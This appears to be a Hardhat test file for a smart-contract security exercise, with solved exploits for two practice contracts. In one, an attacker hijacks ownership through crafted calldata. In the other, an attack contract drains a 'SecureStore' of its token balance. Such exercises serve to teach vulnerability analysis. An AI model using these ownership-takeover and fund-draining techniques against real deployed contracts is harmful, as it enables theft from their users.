import { SignerWithAddress } from '@nomincfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { utils } from 'ethers-v5';
import { ethers } from 'hardhat';
const { deployContract, getSigners, parseEther } = ethers;

import { RestrictedOwner, UnrestrictedOwner } from '../../../typechain-types';
import { DummyERC20, RentingLibrary, SecureStore } from '../../../typechain-types';

describe('Call Attack Exercise', () => {
  describe('Exercise 1', () => {
    let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

    let unrestrictedOwner: UnrestrictedOwner;
    let restrictedOwner: RestrictedOwner;

    before(async () => {
      [deployer, user, attacker] = await getSigners();

      // Deploy
      unrestrictedOwner = await deployContract('UnrestrictedOwner');
      restrictedOwner = await deployContract('RestrictedOwner', [unrestrictedOwner.target]);

      // Any user can take ownership on `UrestrictedOwner` contract
      await expect(unrestrictedOwner.connect(user).changeOwner(user.address)).not.to.be.reverted;
      expect(await unrestrictedOwner.owner()).to.be.equal(user.address);

      // Any user can't take ownership on `RestrictedOwner` contract
      await expect(restrictedOwner.connect(user).updateSettings(user.address, user.address)).to.be.reverted;
      expect(await restrictedOwner.owner()).to.be.equal(deployer.address);
      expect(await restrictedOwner.manager()).to.be.equal(deployer.address);
    });

    it('Exploit', async () => {
      const iface = new utils.Interface(["function changeOwner(address _newOwner)"]);
      const data = iface.encodeFunctionData(`changeOwner`, [attacker.address]);
      await attacker.sendTransaction({
        from: attacker.address,
        to: restrictedOwner.target,
        data: data
      });

      await restrictedOwner.connect(attacker).updateSettings(attacker.address,
        attacker.address);
    });

    after(async () => {
      // Attacker should take ownership on `RestrictedOwner` contract
      expect(await restrictedOwner.owner()).to.be.equal(attacker.address);
      expect(await restrictedOwner.manager()).to.be.equal(attacker.address);
    });
  });

  describe("Exercise 2", async () => {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let rentingLibrary: RentingLibrary;
    let usdc: DummyERC20;
    let secureStore: SecureStore;

    const INITIAL_SUPPLY = parseEther('100');
    const ATTACKER_INITIAL_BALANCE = parseEther('100');
    const STORE_INITIAL_BALANCE = parseEther('100000');
    const DAILY_RENT_PRICE = parseEther('50');

    before(async () => {
      /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

      [deployer, attacker] = await ethers.getSigners();

      // Deploy Library Contract
      rentingLibrary = await deployContract('RentingLibrary');
      // Deploy Token
      usdc = await deployContract('DummyERC20', ['USDC Token', 'USDC', INITIAL_SUPPLY]);
      // Deploy secureStore Contract
      secureStore = await deployContract('SecureStore', [rentingLibrary.target, DAILY_RENT_PRICE, usdc.target]);

      // Setting up the attacker
      await usdc.mint(attacker.address, ATTACKER_INITIAL_BALANCE);

      // Setting up the SecureStore
      await usdc.mint(secureStore.target, STORE_INITIAL_BALANCE);
    });

    it('Exploit', async () => {
      const attackerContract = await deployContract('AttackSecureStore', [usdc.target, secureStore.target], attacker);

      await usdc.connect(attacker).transfer(attackerContract.target, ATTACKER_INITIAL_BALANCE);
      await attackerContract.attack();
      await secureStore.connect(attacker).withdrawAll();
    });

    after(async () => {
      /** SUCCESS CONDITIONS */

      // Attacker stole all the funds from the SecureStore contract
      expect(await usdc.balanceOf(secureStore.target)).to.eq(0);
      expect(await usdc.balanceOf(attacker.address)).to.eq(ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE);
    });
  });
});
